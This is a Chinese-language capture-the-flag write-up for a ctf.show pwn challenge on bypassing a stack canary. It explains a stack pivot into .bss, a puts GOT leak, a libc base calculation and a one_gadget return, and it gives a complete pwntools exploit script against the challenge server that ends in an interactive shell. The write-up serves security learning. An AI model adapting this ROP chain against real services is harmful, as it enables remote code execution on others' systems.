# 挑战简介
Bypass Canary 姿势6

# 思路
这一题的难度有点大，主要运用了栈迁移，这个知识点有点没搞懂  

总体的攻击思路是，先泄露puts地址，然后进行栈迁移，然后弄到libc基地址，直接计算one_gadget然后返回地址到栈迁移的bss地址即可  

首先获取leave，pop_rdi,rsi以及bss的地址  
```
leave_addr = 0x40098c

pop_rdi = 0x400be3

pop_rsi_r15 = 0x400be1

bss_start = 0x602010        #readelf
```

第一部分payload  
```
payload = b'a' * 0x510 + p64(bss_start - 0x8)
# 填写偏移，恰好到ebp的存储位置，将ebp写入bss位置的往前8个字节
payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.sym['puts'])
# 往rdi存入puts在got表的数据，然后执行``puts(elf.got['puts'])``，从而输出puts函数的真实地址
payload += p64(pop_rdi) + p64(0)
# 置零rdi
payload += p64(pop_rsi_r15) + p64(bss_start) + p64(0) + p64(elf.sym['read'])
# 将bss的地址存入rsi，并置零r15，然后read执行，读取接下来要输入的payload进bss这个新栈
payload += p64(leave_addr)
# 执行leave ret 将rsp指向bss，并ret跳转到payload的第一个地址  
```

接下来要做的就仅仅是收到puts地址，计算基址，跳转binsh了  

```
io.recvuntil('See you next time!\n')
puts = u64(io.recv(6).ljust(8, b'\x00'))
print('puts: ' + hex(puts))
libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
one_gadget = libc_base + 0x4f302
```

整体代码  

```
from pwn import *
from LibcSearcher import *
context(arch = "amd64",os = 'linux',log_level = 'debug')

#context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show', 28115)

elf = ELF('D:\edge 下载\pwn')

leave_addr = 0x40098c

pop_rdi = 0x400be3

pop_rsi_r15 = 0x400be1

bss_start = 0x602010

payload = b'a' * 0x510 + p64(bss_start - 0x8)
payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.sym['puts'])
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss_start) + p64(0) + p64(elf.sym['read'])
payload += p64(leave_addr)

payload = payload.ljust(0x1000, b'a')
io.sendlineafter('How much do you want to send this time?\n', str(0x1000))
sleep(0.5)
io.send(payload)
sleep(0.5)

io.recvuntil('See you next time!\n')
puts = u64(io.recv(6).ljust(8, b'\x00'))
print('puts: ' + hex(puts))
libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
one_gadget = libc_base + 0x4f302

payload = p64(one_gadget)
io.send(payload)

io.interactive()
```
